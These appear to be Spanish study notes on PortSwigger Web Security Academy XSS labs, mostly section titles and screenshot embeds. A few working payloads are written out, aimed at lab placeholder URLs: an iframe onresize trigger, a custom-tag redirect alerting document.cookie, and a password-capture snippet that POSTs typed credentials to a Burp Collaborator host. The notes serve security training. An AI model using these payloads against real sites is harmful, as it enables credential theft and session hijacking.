es una vulnerabilidad de seguridad en aplicaciones web que permite a los atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios. Estos scripts maliciosos pueden robar información sensible, como cookies de sesión, credenciales de usuario, o manipular el contenido de la página web de manera perjudicial para el usuario

# XSS reflejado en contexto HTML sin nada codificado

![[01.XSS_Nada_Codificado.png]]
# XSS almacenado en contexto HTML sin nada codificado

![[01.XSS_SinCodificado.png]]
![[02.XSS_SinCodificado.png]]
![[03.XSS_SinCodificado.png]]

# DOM XSS en `document.write`el receptor usando la fuente`location.search`

![[01.DOM_XSS_Fuente_Location.Search.png]]
![[02.DOM_XSS_Fuente_Location.Search.png]]
![[03.DOM_XSS_Fuente_Location.Search.png]]
![[04.DOM_XSS_Fuente_Location.Search.png]]

# DOM XSS en el receptor `InnerHTML` usando la ubicación de `location.search`

![[01.DOM_XSS_Ubicacion_Location.search.png]]
![[02.DOM_XSS_Ubicacion_Location.search.png]]

# DOM XSS en el receptor de atributos de anclaje jQuery `href`usando `location.search`la fuente

![[01.ReceptordeAtributos.png]]
![[02.ReceptordeAtributos.png]]
![[03.ReceptordeAtributos.png]]

# DOM XSS en el receptor del selector jQuery usando un evento hashchange

![[01.ReceptorSelectorJquery.png]]
![[02.ReceptorSelectorJquery.png]]
![[03.ReceptorSelectorJquery.png]]
![[04.ReceptorSelectorJquery.png]]

# XSS reflejado en atributo con corchetes angulares codificados en HTML

![[01.CodificadosHTML.png]]
![[02.CodificadosHTML.png]]

# XSS almacenado en un `href`atributo de anclaje con comillas dobles codificadas en HTML

![[01.ComillasDoblesCodificadasenHTML.png]]
![[02.ComillasDoblesCodificadasenHTML.png]]
![[03.ComillasDoblesCodificadasenHTML.png]]

# XSS reflejado en una cadena de JavaScript con corchetes angulares codificados en HTML

![[01.CorchetesAngularesHTML.png]]
![[02.CorchetesAngularesHTML.png]]

# DOM XSS en `document.write`el receptor usando la fuente `location.search`dentro de un elemento de selección

![[01.DOM_ElementoDeSeleccion.png]]
![[02.DOM_ElementoDeSeleccion.png]]
![[03.DOM_ElementoDeSeleccion.png]]

# DOM XSS en expresión AngularJS con corchetes angulares y comillas dobles codificadas en HTML

![[01.ComillasDoblesCodificadasHTML.png]]
![[02.ComillasDoblesCodificadasHTML.png]]
![[03.ComillasDoblesCodificadasHTML.png]]

# XSS DOM reflejado

![[01.XSS_DOM_Reflejado.png]]
![[02.XSS_DOM_Reflejado.png]]
![[03.XSS_DOM_Reflejado.png]]
![[04.XSS_DOM_Reflejado.png]]
![[05.XSS_DOM_Reflejado.png]]

# XSS de DOM almacenado

![[01.XSS_DOM_Almacenado.png]]
![[02.XSS_DOM_Almacenado.png]]
![[03.XSS_DOM_Almacenado.png]]

# XSS reflejado en contexto HTML con la mayoría de las etiquetas y atributos bloqueados

![[01.AtributosBloqueados.png]]
![[02.AtributosBloqueados.png]]
![[03.AtributosBloqueados.png]]
![[04.AtributosBloqueados.png]]
![[05.AtributosBloqueados.png]]
![[06.AtributosBloqueados.png]]
![[07.AtributosBloqueados.png]]

1. `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

![[08.AtributosBloqueados.png]]

# XSS reflejado en contexto HTML con todas las etiquetas bloqueadas excepto las personalizadas

```js
<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
```
![[01.XSS_EtiquetasBloqueadas.png]]
![[02.XSS_EtiquetasBloqueadas.png]]

# XSS reflejado con algún marcado SVG permitido

![[01.SVG_Permitido.png]]
![[02.SVG_Permitido.png]]
![[03.SVG_Permitido.png]]
![[04.SVG_Permitido.png]]
![[05.SVG_Permitido.png]]
![[06.SVG_Permitido.png]]
![[07.SVG_Permitido.png]]
![[08.SVG_Permitido.png]]
![[09.SVG_Permitido.png]]

# XSS reflejado en la etiqueta de enlace canónico

![[01.EtiquetaConEnlaceCanonico.png]]
![[02.EtiquetaConEnlaceCanonico.png]]
- En Windows:`ALT+SHIFT+X`
- En MacOS:`CTRL+ALT+X`
- En Linux:`Alt+X`

# XSS reflejado en una cadena de JavaScript con comillas simples y barra invertida como caracteres de escape

![[01.JavaScriptComillasSimples.png]]
![[02.JavaScriptComillasSimples.png]]
![[03.JavaScriptComillasSimples.png]]
![[04.JavaScriptComillasSimples.png]]
![[05.JavaScriptComillasSimples.png]]
![[06.JavaScriptComillasSimples.png]]

# XSS reflejado en una cadena de JavaScript con corchetes angulares y comillas dobles codificadas en HTML y comillas simples escapadas

![[01.JsCorchetesAngulares.png]]
![[02.JsCorchetesAngulares.png]]
![[03.JsCorchetesAngulares.png]]
![[04.JsCorchetesAngulares.png]]

# XSS almacenado en `onclick`eventos con corchetes angulares y comillas dobles codificadas en HTML y comillas simples y barra invertida con escape

![[01.XSS_onClick.png]]
![[02.XSS_onClick.png]]
![[03.XSS_onClick.png]]
![[04.XSS_onClick.png]]
![[05.XSS_onClick.png]]

# XSS reflejado en un literal de plantilla con corchetes angulares, comillas simples y dobles, barras invertidas y comillas invertidas con escape Unicode

![[01.XSS_EscapeUnicode.png]]
![[02.XSS_EscapeUnicode.png]]
![[03.XSS_EscapeUnicode.png]]
![[04.XSS_EscapeUnicode.png]]

# Explotación de secuencias de comandos entre sitios para capturar contraseñas


```
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
![[01.XSS_CapturaContraseñas.png]]
![[02.XSS_CapturaContraseñas.png]]
![[03.XSS_CapturaContraseñas.png]]
![[04.XSS_CapturaContraseñas.png]]

# Explotación de XSS para ejecutar CSRF

![[01.XSS_CSRF.png]]
![[02.XSS_CSRF.png]]
![[03.XSS_CSRF.png]]
![[04.XSS_CSRF.png]]

